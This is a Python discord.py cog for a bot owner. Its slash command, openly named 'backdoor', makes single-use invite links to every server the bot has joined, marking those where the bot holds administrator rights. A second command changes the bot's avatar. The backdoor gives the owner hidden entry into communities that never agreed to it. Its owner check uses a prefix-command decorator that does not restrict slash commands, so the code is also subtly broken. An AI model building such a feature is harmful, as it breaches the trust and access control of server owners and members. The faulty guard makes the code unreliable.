import discord
from discord.ext import commands
from discord import app_commands
import asyncio

class Owner(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    @app_commands.command(name="backdoor", description='list Servers with invites')
    @commands.is_owner()
    async def server(self, interaction: discord.Interaction):
        embed = discord.Embed(title="Server List", color=discord.Color.blue())

        for guild in self.bot.guilds:
            permissions = guild.get_member(self.bot.user.id).guild_permissions
            if permissions.administrator:
                invite_admin = await guild.text_channels[0].create_invite(max_uses=1)
                embed.add_field(name=guild.name, value=f"[Join Server (Admin)]({invite_admin})", inline=True)
            elif permissions.create_instant_invite:
                invite = await guild.text_channels[0].create_invite(max_uses=1)
                embed.add_field(name=guild.name, value=f"[Join Server]({invite})", inline=True)
            else:
                embed.add_field(name=guild.name, value="*[No invite permission]*", inline=True)

        await interaction.response.send_message(embed=embed, ephemeral=True)

    @app_commands.command(name="pfp", description="Change bot's profile picture.")
    @commands.is_owner()
    async def change_profile_picture(self, ctx, attachment: discord.Attachment):
        await ctx.defer()
        if not attachment.content_type.startswith('image/'):
            await ctx.send("Please upload an image file.")
            return
        
        await ctx.send("Profile picture change in progress...")
        await self.bot.user.edit(avatar=await attachment.read())
        await ctx.send("Profile picture changed successfully!")

    
    

async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Owner(bot))